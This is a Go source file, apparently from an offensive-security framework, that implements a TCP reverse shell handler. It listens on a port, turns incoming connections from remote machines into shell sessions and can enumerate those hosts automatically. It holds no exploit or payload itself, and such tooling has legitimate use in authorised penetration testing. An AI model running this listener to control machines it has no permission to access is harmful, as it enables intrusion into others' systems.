package handler

import (
	"fmt"
	"github.com/kulinacs/cast/agent"
	"github.com/kulinacs/cast/session"
	log "github.com/sirupsen/logrus"
	"net"
	"strconv"
)

// TCPHandler is a TCP reverse shell handler
type TCPHandler struct {
	SessionCallback func(sess session.Shell)
	AutoEnumerate   bool
	soc             net.Listener
	active          bool
}

func (handler *TCPHandler) String() string {
	return fmt.Sprintf("%s Handler - %s", handler.Type(), handler.soc.Addr())
}

// Type returns the sessions type
func (handler *TCPHandler) Type() string {
	return "TCP"
}

// Handle listens for and creates incoming sessions
func (handler *TCPHandler) Handle(port int) {
	soc, err := net.Listen("tcp4", ":"+strconv.Itoa(port))
	if err != nil {
		log.WithFields(log.Fields{"port": port, "err": err}).Error("failed to start tcp handler")
		return
	}
	handler.soc = soc
	handler.active = true
	log.WithFields(log.Fields{"port": port}).Info("starting handler")
	defer soc.Close()
	for handler.active {
		conn, err := soc.Accept()
		if err != nil {
			log.WithFields(log.Fields{"port": port, "err": err}).Error("failed to accept incoming connection")
			continue
		}
		shellSession, err := session.UpgradeShell(agent.NewShell(conn, 20, conn.RemoteAddr()))
		handler.SessionCallback(shellSession)
		if err != nil {
			log.WithFields(log.Fields{"err": err}).Error("failed to upgrade session")
			continue
		}
		if handler.AutoEnumerate {
			shellSession.Enumerate()
		}
		log.WithFields(log.Fields{"session": shellSession}).Info("new session")
	}
}

// Stop halts a running handler
func (handler *TCPHandler) Stop() error {
	if handler.active {
		handler.active = false
		return handler.soc.Close()
	}
	return nil
}
